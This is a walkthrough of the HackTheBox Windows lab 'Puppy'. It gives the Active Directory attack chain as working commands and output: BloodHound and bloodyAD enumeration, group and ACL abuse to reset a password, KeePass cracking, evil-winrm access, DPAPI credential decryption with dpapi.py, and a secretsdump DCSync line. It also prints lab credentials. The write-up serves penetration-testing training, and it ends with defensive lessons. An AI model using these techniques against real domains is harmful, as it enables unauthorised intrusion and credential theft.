---
title: Puppy
categories: [HackTheBox]
tags: [acl, windows, ldap, kerberos, smb, nmap, passwordcracking]
media_subpath: /images/hackthebox_puppy/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/6a127b39657062e42c1a8dfdcd23475d.png'
---

# HackTheBox Puppy - Complete Walkthrough

## Overview

Puppy is a Medium Windows machine that demonstrates advanced Active Directory attack techniques including ACL abuse, and DPAPI credential extraction. The machine showcases real-world Windows penetration testing scenarios starting with initial credentials.

**Difficulty:** Medium  
**OS:** Windows  
**Key Techniques:** ACL abuse, DPAPI extraction, Password cracking, Group membership manipulation

### Attacks Used in This Box

This machine demonstrates several critical Active Directory attack techniques:

- **Active Directory Enumeration** - BloodHound analysis and LDAP enumeration 
- **Password Cracking** - KeePass database cracking with John the Ripper
- **Active Directory ACL Abuse** - Exploiting GenericAll permissions ([Theory](/theory/windows/AD/acl/))
- **DPAPI Credential Extraction** - Extracting stored credentials from Windows Credential Manager 

---

## Initial Access

### Provided Credentials

As mentioned in the machine description, this box simulates a real-world Windows penetration test scenario where you start with initial credentials:

**Initial Credentials:**
- **Username:** `levi.james`
- **Password:** `KingofAkron2025!`
- **Domain:** `puppy.htb`

> **Info Status:** As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
{: .prompt-info}

## Initial Reconnaissance

### Port Scanning

Let's start by scanning the target machine to identify open services:

```bash
nmap -sC -sV -oA puppy 10.129.14.248
```

**Results:**

```bash
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2025-08-06 20:16:31Z)
111/tcp   open  rpcbind      syn-ack 2-4 (RPC #100000)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
2049/tcp  open  nlockmgr     syn-ack 1-4 (RPC #100021)
3260/tcp  open  iscsi?       syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc        syn-ack Microsoft Windows RPC
63314/tcp open  msrpc        syn-ack Microsoft Windows RPC
63350/tcp open  msrpc        syn-ack Microsoft Windows RPC
```

This is clearly a Windows Domain Controller running Active Directory services because of the presence of `LDAP`, `Kerberos`, and `SMB` services. The domain can be seen from the scripts that `nmap` ran on the host, `PUPPY.HTB`. And with the `nxc` we can see that the hostname is `DC`.

**Key Services Identified:**
- **Domain Controller:** LDAP (389, 3268), Kerberos (88), DNS (53)
- **SMB Services:** NetBIOS (139), SMB (445)
- **RPC Services:** Multiple RPC endpoints for Windows communication
- **WinRM:** HTTP API on port 5985 for remote management

---

## Active Directory Enumeration

### BloodHound Analysis

Let's start by performing comprehensive Active Directory enumeration using BloodHound to understand the domain structure and potential attack paths:

```bash
bloodhound-ce-python -ns $IP -u $USERAD -p $PASS -c All --zip -d $DOMAIN
```

**Command Explanation:**
- `-ns`: Nameserver IP for DNS resolution
- `-u`: Username for authentication
- `-p`: Password for authentication
- `-c All`: Collect all available data
- `--zip`: Compress the output
- `-d`: Domain name

This command will collect comprehensive Active Directory data including users, groups, computers, and their relationships.

Looking at the outbound permissions for our user `levi.james`, we can see that he has `GenericWrite` permissions on the `DEVELOPERS` group:

![BloodHound Collection](file-20250806131712005.png)

### LDAP Enumeration with bloodyAD

Now let's enumerate what permissions our current user has using the `bloodyAD` tool:

```bash
bloodyAD -d $DOMAIN --host $IP -u $USERAD -p $PASS get writable
```

![LDAP Enumeration Results](file-20250927214535212.png)

**Key Finding:** User `levi.james` has `GenericWrite` permissions on the `DEVELOPERS` group, which is a significant privilege escalation opportunity.

### Group Membership Manipulation

We can add ourselves to the DEVELOPERS group to gain additional privileges:

```bash
bloodyAD --host $HOSTNAME -u $USERAD -p $PASS -d $DOMAIN --dc-ip $IP add groupMember "DEVELOPERS" $USERAD
```

**Result:**
```bash
[+] levi.james added to DEVELOPERS
```

**Command Explanation:**
- `add groupMember`: Adds a user to a group
- `"DEVELOPERS"`: Target group name
- `$USERAD`: User to add to the group

### SMB Share Access

Being a member of the DEVELOPERS group allows us to see the DEV share:

![SMB Share Access](file-20250806132220627.png)

Let's access the DEV share to explore its contents:

```bash
smbclient.py $DOMAIN/$USERAD:$PASS@FQDN
```

Once connected:

```bash
shares
use DEV
get recovery.kdbx
```

**Key Finding:** We discover a `recovery.kdbx` file, which is a KeePass database that could contain valuable credentials.

---

## Password Cracking

### KeePass Database Analysis

The `recovery.kdbx` file is a KeePass database that we can attempt to crack:

```bash
keepass2john recovery.kdbx
```

This command extracts the hash from the KeePass database for cracking.

### Hash Cracking with Hashcat

We can crack the KeePass database using hashcat:

![Hashcat Cracking Process](file-20250806132531229.png)

![Hashcat Results](file-20250806132552835.png)

**Key Finding:** We successfully crack the KeePass database and obtain passwords for several users

After opening the KeePass database with the cracked password, we find multiple user credentials, the one for the ant.edwards account is a valid one:

![KeePass Database Contents](file-20250806132657283.png)

![Additional User Credentials](file-20250927215348209.png)

## Privilege Escalation

### More LDAP Enumeration

Now that we have additional credentials, let's enumerate what permissions we have with the new user:

```bash
bloodyAD -d $DOMAIN --host $IP -u $USERAD -p $PASS get writable
```

![Advanced LDAP Enumeration](file-20250806141733921.png)

**Key Finding:** We now have `GenericAll` permissions over user `adam.silver`, which includes:
- **Write Dacl:** Can modify access control lists
- **Write Owner:** Can change object ownership
- **Write:** Can modify object properties

### ACL Abuse - Password Reset

With `GenericAll` permissions over `adam.silver`, we can change the user's password:

```bash
net rpc password "adam.silver" 'Antman2025!' -U "$DOMAIN"/"$USERAD"%"$PASS" -S $IP
```

![Password Reset Success](file-20250806134348793.png)

**Command Explanation:**
- `net rpc password`: Changes a user's password via RPC
- `"adam.silver"`: Target user account
- `'Antman2025!'`: New password
- `-U`: Authentication credentials
- `-S`: Target server

### Account Re-enablement

The account might be disabled, so we need to enable it:

![Account Disabled Status](file-20250806134455493.png)

We can enable the account by removing the `ACCOUNTDISABLE` flag:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -p $PASS remove uac -f ACCOUNTDISABLE adam.silver
```

**Result:**
```bash
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

**Command Explanation:**
- `remove uac`: Removes User Account Control flags
- `-f ACCOUNTDISABLE`: Specific flag to remove
- `adam.silver`: Target user account

### WinRM Access

Now we can authenticate with the newly enabled account:

![WinRM Authentication](file-20250806134604472.png)

```bash
evil-winrm -i $IP -u adam.silver -p $PASS
```

**Command Explanation:**
- `evil-winrm`: WinRM client for remote access
- `-i`: Target IP address
- `-u`: Username
- `-p`: Password

---

## Lateral Movement

### Backup File Discovery

On the root directory, we discover a backup folder containing a site backup:

`c:\Backups\site-backup-2024-12-30.zip`

![Backup Folder Discovery](file-20250806135556515.png)

Let's download this backup file to our local machine for analysis.

### Credential Extraction from Backup

After downloading and extracting the backup file, we find a credential in the `nms-auth-config.xml.bak` file for user `steph.cooper`:

![Credential Discovery](file-20250806135841828.png)

**Key Finding:** We discover credentials for user `steph.cooper` in the backup configuration file.

### Additional User Access

We can now login with the newly discovered credentials:

![Additional WinRM Access](file-20250806140005729.png)

```bash
evil-winrm -i $IP -u steph.cooper -p $PASS
```

---

## DPAPI Credential Extraction

### DPAPI Overview

DPAPI (Data Protection API) is a Windows service that encrypts and decrypts data using the user's password. When users store credentials in Windows Credential Manager, they are encrypted using DPAPI and stored in specific locations.

### Locating DPAPI Files

The user `steph.cooper` has DPAPI credential files stored in the standard Windows locations. Let's locate these files:

```
*Evil-WinRM* PS C:\Users\steph.cooper> Get-ChildItem -Path C:\Users\steph.cooper\AppData -File -Recurse -Force | Where-Object { $_.FullName -match '\\credentials\\' }

    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D

    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Users\steph.cooper>
```

After that we need to copy these files to a location where we can download them after removing the system and hidden attributes:

#### Copy the files:
```bash
*Evil-WinRM* PS C:\Users\steph.cooper> copy C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D .\cred1
*Evil-WinRM* PS C:\Users\steph.cooper> copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 .\cred2
*Evil-WinRM* PS C:\Users\steph.cooper> dir


    Directory: C:\Users\steph.cooper

```

#### Remove the system and hidden attributes:

```bash
*Evil-WinRM* PS C:\Users\steph.cooper> attrib -s -h cred*
*Evil-WinRM* PS C:\Users\steph.cooper> dir

    Directory: C:\Users\steph.cooper

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:14 AM          11068 cred1
-a----          3/8/2025   7:54 AM            414 cred2

*Evil-WinRM* PS C:\Users\steph.cooper> download cred*
Info: Downloading C:\Users\steph.cooper\cred* to steph.cooper
Info: Download successful!

```

#### Locating and Downloading the Master Key
```
*Evil-WinRM* PS C:\Users\steph.cooper> gci -path c:\users\steph.cooper -force -recurse -file -ea silentlycontinue | Where-Object { $_.FullName -match '\\Protect\\' }

    Directory: C:\users\steph.cooper\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM             24 CREDHIST
-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST

    Directory: C:\users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred


*Evil-WinRM* PS C:\Users\steph.cooper> copy C:\users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 .\mkey
*Evil-WinRM* PS C:\Users\steph.cooper> attrib -s -h .\mkey
*Evil-WinRM* PS C:\Users\steph.cooper> download mkey

Info: Downloading C:\Users\steph.cooper\mkey to mkey
Info: Download successful!
```

### DPAPI Master Key Decryption

Now we can decrypt the master key using the user's password:

```bash
dpapi.py masterkey -file mkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

**Results:**

```bash
Impacket v0.13.0.dev0+20250909.125012.082dca34 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

**Command Explanation:**
- `dpapi.py masterkey`: Decrypts DPAPI master key files
- `-file mkey`: Master key file to decrypt
- `-sid`: User's Security Identifier
- `-password`: User's password for decryption

### DPAPI Credential Decryption

Now we can use the decrypted master key to decrypt the stored credentials:

```bash
dpapi.py credential -file cred2 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

**Results:**
```bash
Impacket v0.13.0.dev0+20250909.125012.082dca34 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

**Key Finding:** We successfully extract domain administrator credentials:
- **Username:** `steph.cooper_adm`
- **Password:** `FivethChipOnItsWay2025!`

![DPAPI Decryption Process](file-20250806141033415.png)

![Credential Extraction Results](file-20250806141332807.png)

---

## Domain Admin Access

### Final Authentication

We can now use the extracted administrator credentials to access the domain controller:

![Domain Admin Login](file-20250806141552689.png)

```bash
evil-winrm -i $IP -u steph.cooper_adm -p FivethChipOnItsWay2025!
```

**Command Explanation:**
- `evil-winrm`: WinRM client for remote access
- `-i`: Target IP address
- `-u`: Username
- `-p`: Password

### Alternative Attack Path - DCSync

We could also have performed a DCSync attack to dump all domain user hashes:

![DCSync Attack](file-20250806141505893.png)

```bash
secretsdump.py -k -no-pass -just-dc-ntlm -just-dc-user Administrator 'steph.cooper_adm@PUPPY.HTB'
```

---

## Understanding the Attack Chain

This attack demonstrates several sophisticated Active Directory attack techniques:

1. **Initial Access:** Starting with provided credentials (realistic scenario)
2. **Information Gathering:** BloodHound enumeration and SMB share analysis
3. **Password Cracking:** KeePass database cracking with John the Ripper
4. **Privilege Escalation:** ACL abuse and group membership manipulation
5. **Lateral Movement:** Backup file analysis and credential discovery
6. **DPAPI Extraction:** Extracting stored credentials from Windows Credential Manager
7. **Domain Compromise:** Using extracted administrator credentials

### Key Concepts

- **ACL Abuse:** Exploiting GenericAll and GenericWrite permissions
- **KeePass Cracking:** Breaking password-protected credential databases
- **DPAPI Extraction:** Decrypting Windows stored credentials
- **Group Membership Manipulation:** Adding users to privileged groups
- **Backup Analysis:** Extracting credentials from backup files

---

## Conclusion

The Puppy machine demonstrates several critical Active Directory security concepts:

1. **ACL Management:** The importance of proper access control list configuration
2. **Credential Storage:** Secure storage of sensitive credentials
3. **Group Membership:** Careful management of group memberships and permissions
4. **Backup Security:** Securing backup files that may contain sensitive information
5. **DPAPI Security:** Understanding how Windows stores and protects credentials

**Key Takeaways:**
- Always implement proper ACL management and regular auditing
- Secure credential storage and avoid hardcoded passwords in backup files
- Monitor for unusual group membership changes
- Encrypt backup files containing sensitive information
- Implement proper DPAPI security measures and monitor credential access
